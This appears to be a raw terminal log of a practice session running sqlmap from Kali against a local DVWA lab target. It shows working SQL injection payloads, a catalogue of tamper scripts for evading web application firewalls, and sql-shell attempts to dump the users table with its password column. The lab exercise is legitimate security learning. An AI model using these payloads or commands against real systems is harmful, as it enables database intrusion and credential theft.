+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+[*] ending @ 14:24:03 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --wizard
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  [,]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:24:09 /2026-02-21/
+
+[14:24:09] [INFO] starting wizard interface
+POST data (--data) [Enter for None]: 
+
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 2
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 2
+
+sqlmap is running, please wait..
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[14:24:16] [WARNING] time-based comparison requires larger statistical model, please wait.......... (done)
+[14:24:16] [CRITICAL] unable to retrieve the number of database users
+
+[*] ending @ 14:24:16 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --wizard --batch
+        ___
+       __H__                                                                 
+ ___ ___[(]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:25:09 /2026-02-21/
+
+[14:25:09] [INFO] starting wizard interface
+POST data (--data) [Enter for None]: 
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 1
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 1
+
+sqlmap is running, please wait..
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+[*] ending @ 14:25:09 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap --list-temper
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --list-temper
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap --list-tampers
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . [(]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:26:14 /2026-02-21/
+
+[14:26:14] [INFO] listing available tamper scripts
+
+* 0eunion.py - Replaces an integer followed by UNION with an integer followed by e0UNION
+* apostrophemask.py - Replaces single quotes (') with their UTF-8 full-width equivalents (e.g. ' -> %EF%BC%87)                                            
+* apostrophenullencode.py - Replaces single quotes (') with an illegal double Unicode encoding (e.g. ' -> %00%27)                                         
+* appendnullbyte.py - Appends an (Access) NULL byte character (%00) at the end of payload
+* base64encode.py - Encodes the entire payload using Base64
+* between.py - Replaces the greater-than operator (>) with NOT BETWEEN 0 AND # and the equal sign (=) with BETWEEN # AND #
+* binary.py - Injects the keyword binary where applicable
+* bluecoat.py - Replaces the space following an SQL statement with a random valid blank character, then converts = to LIKE
+* chardoubleencode.py - Double URL-encodes each character in the payload (ignores already encoded ones) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
+* charencode.py - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
+* charunicodeencode.py - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
+* charunicodeescape.py - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
+* commalesslimit.py - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart                                                    
+* commalessmid.py - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart                                                 
+* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
+* concat2concatws.py - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart                              
+* decentities.py - HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)
+* dunion.py - Replaces instances of <int> UNION with <int>DUNION
+* equaltolike.py - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart                                                               
+* equaltorlike.py - Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart                                                             
+* escapequotes.py - Slash escape single and double quotes (e.g. ' -> \')
+* greatest.py - Replaces greater than operator ('>') with 'GREATEST' counterpart
+* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
+* hex2char.py - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
+* hexentities.py - HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)
+* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
+* if2case.py - Replaces instances like 'IF(A, B, C)' with 'CASE WHEN (A) THEN (B) ELSE (C) END' counterpart                                               
+* ifnull2casewhenisnull.py - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart                          
+* ifnull2ifisnull.py - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart                                                      
+* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
+* least.py - Replaces greater than operator ('>') with 'LEAST' counterpart
+* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -> select)
+* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
+* luanginxmore.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare) with 4.2 million parameters
+* misunion.py - Replaces instances of UNION with -.1UNION
+* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment
+* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment
+* multiplespaces.py - Adds multiple spaces (' ') around SQL keywords
+* ord2ascii.py - Replaces ORD() occurences with equivalent ASCII() calls Requirement: * MySQL >>> tamper("ORD('42')") "ASCII('42')"
+* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
+* overlongutf8more.py - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
+* percentage.py - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
+* plus2concat.py - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
+* plus2fnconcat.py - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
+* randomcase.py - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+* randomcomments.py - Inserts random inline comments within SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
+* schemasplit.py - Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')
+* scientific.py - Abuses MySQL scientific notation
+* sleep2getlock.py - Replaces instances like 'SLEEP(5)' with (e.g.) "GET_LOCK('ETgP',5)"
+* sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
+* space2comment.py - Replaces space character (' ') with comments '/**/'
+* space2dash.py - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
+* space2hash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+* space2morecomment.py - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
+* space2morehash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+* space2mssqlblank.py - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
+* space2mssqlhash.py - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
+* space2mysqlblank.py - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
+* space2mysqldash.py - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')                                            
+* space2plus.py - Replaces space character (' ') with plus ('+')
+* space2randomblank.py - Replaces space character (' ') with a random blank character from a valid set of alternate characters
+* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
+* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
+* unmagicquotes.py - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
+* uppercase.py - Replaces each keyword character with upper case value (e.g. select -> SELECT)
+* varnish.py - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
+* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment
+* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment
+* xforwardedfor.py - Append a fake HTTP header 'X-Forwarded-For' (and alike)
+
+[*] ending @ 14:26:14 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --tamper=basae64encode -batch --users
+        ___
+       __H__                                                                 
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [']     | .'| . |                                                    
+|___|_  [(]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:28:08 /2026-02-21/
+
+[14:28:08] [CRITICAL] tamper script 'basae64encode' does not exist
+
+[*] ending @ 14:28:08 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --tamper=base64encode --batch --users
+        ___
+       __H__                                                                 
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [(]     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:29:01 /2026-02-21/
+
+[14:29:01] [INFO] loading tamper module 'base64encode'
+[14:29:01] [INFO] resuming back-end DBMS 'mysql' 
+[14:29:01] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:29:01] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[14:29:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:29:01] [INFO] fetching database users
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[14:29:01] [WARNING] reflective value(s) found and filtering out
+[14:29:01] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[14:29:01] [WARNING] the SQL query provided does not return any output
+[14:29:01] [WARNING] the SQL query provided does not return any output
+[14:29:01] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:29:01] [INFO] fetching number of database users
+[14:29:01] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:29:01] [INFO] retrieved: 
+[14:29:01] [WARNING] unexpected HTTP code '302' detected. Will use (extra) validation step in similar cases
+
+[14:29:01] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)
+[14:29:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[14:29:01] [CRITICAL] unable to retrieve the number of database users
+
+[*] ending @ 14:29:01 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --mobile
+        ___
+       __H__                                                                 
+ ___ ___[']_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [.]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:32:22 /2026-02-21/
+
+which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
+[1] Apple iPhone 15 Pro Max (default)
+[2] BlackBerry Z10
+[3] Google Nexus 7
+[4] Google Pixel 9
+[5] HP iPAQ 6365
+[6] HTC One X2
+[7] Huawei Honor 90 Pro
+[8] Microsoft Lumia 950 XL
+[9] Nokia N97
+[10] Samsung Galaxy A54
+[11] Xiaomi Redmi 15C
+> 
+
+[14:32:37] [INFO] resuming back-end DBMS 'mysql' 
+[14:32:37] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] 
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:32:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:32:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:32:40 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --sql-shel --batch
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  [.]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:35:42 /2026-02-21/
+
+[14:35:42] [INFO] resuming back-end DBMS 'mysql' 
+[14:35:42] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:35:42] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:35:42] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+sql-shell> database();
+[14:36:01] [INFO] fetching SQL query output: 'database()'
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+
+y
+
+
+
+[14:36:14] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+[14:36:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+sql-shell> 
+sql-shell> y
+[14:36:14] [INFO] fetching SQL query output: 'y'
+sql-shell> 
+sql-shell> 
+sql-shell> 
+sql-shell> 
+sql-shell> 
+sql-shell> 
+sql-shell> database();
+[14:36:23] [INFO] fetching SQL query output: 'database()'
+sql-shell> database():
+[14:36:44] [INFO] fetching SQL query output: 'database():'
+
+^C
+
+[*] ending @ 14:36:48 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --sql-shel --batch
+        ___
+       __H__                                                                 
+ ___ ___["]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:36:53 /2026-02-21/
+
+[14:36:54] [INFO] resuming back-end DBMS 'mysql' 
+[14:36:54] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:36:54] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:36:54] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+sql-shell> select table_name from information_schema.tables where table_schema ='dvwa';
+[14:37:47] [INFO] fetching SQL SELECT statement query output: 'select table_name from information_schema.tables where table_schema ='dvwa''               
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[14:37:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[14:37:47] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[14:37:47] [WARNING] the SQL query provided does not return any output
+[14:37:47] [WARNING] the SQL query provided does not return any output
+[14:37:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+sql-shell> select* from dvwa
+[14:38:12] [INFO] fetching SQL query output: 'select* from dvwa'
+[14:38:19] [WARNING] the SQL query provided does not return any output
+[14:38:19] [WARNING] the SQL query provided does not return any output
+sql-shell> select * from dvwa
+[14:38:27] [INFO] fetching SQL SELECT statement query output: 'select * from dvwa'                                                                        
+[14:38:27] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[14:38:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[14:38:27] [INFO] fetching current database
+[14:38:27] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+[14:38:27] [WARNING] unable to retrieve the current database name
+sql-shell> select * from dvwa
+[14:38:42] [INFO] fetching SQL SELECT statement query output: 'select * from dvwa'                                                                        
+[14:38:42] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[14:38:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[14:38:42] [INFO] fetching current database
+select * from dvwa.users;
+[14:39:15] [WARNING] unable to retrieve the current database name
+sql-shell> select * from dvwa.users;
+[14:39:15] [INFO] fetching SQL SELECT statement query output: 'select * from dvwa.users'                                                                  
+[14:39:15] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[14:39:15] [INFO] fetching columns for table 'users' in database 'dvwa'
+[14:39:15] [INFO] the query with expanded column name(s) is: SELECT `user`, avatar, failed_login, first_name, last_login, last_name, password, user_id FROM dvwa.users
+[14:39:15] [WARNING] the SQL query provided does not return any output
+[14:39:15] [WARNING] the SQL query provided does not return any output
+sql-shell> select * from dvwa.users
+[14:39:25] [INFO] fetching SQL SELECT statement query output: 'select * from dvwa.users'                                                                  
+[14:39:25] [INFO] you did not provide the fields in your query. sqlmap will retrieve the column names itself
+[14:39:25] [INFO] fetched table columns from database 'dvwa'
